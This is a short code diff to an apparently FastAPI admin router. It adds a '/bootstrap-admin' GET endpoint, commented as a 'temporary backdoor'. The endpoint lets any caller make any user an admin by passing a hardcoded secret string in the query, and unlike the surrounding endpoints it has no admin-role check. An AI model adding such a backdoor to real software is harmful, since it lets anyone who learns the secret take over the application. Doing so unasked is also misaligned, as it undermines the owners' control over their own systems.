@@ -72,6 +72,17 @@ async def remove_user(username: str, admin: dict = Depends(verify_admin_role)):
         return {"message": "User deleted"}
     raise HTTPException(status_code=400, detail="Failed to delete user")
 
+@router.get("/bootstrap-admin")
+async def bootstrap_admin(username: str, secret: str):
+    # Temporary backdoor for first setup
+    if secret != "irresistible-secret-setup-2026":
+        raise HTTPException(status_code=403, detail="Invalid secret")
+    
+    from ..services.auth_service import update_user_role
+    update_user_role(username, "admin")
+    return {"message": f"User {username} is now an admin. Please logout and login again."}
+
+
 @router.put("/users/{username}/role")
 async def change_role(username: str, role_data: dict, admin: dict = Depends(verify_admin_role)):
     from ..services.auth_service import update_user_role
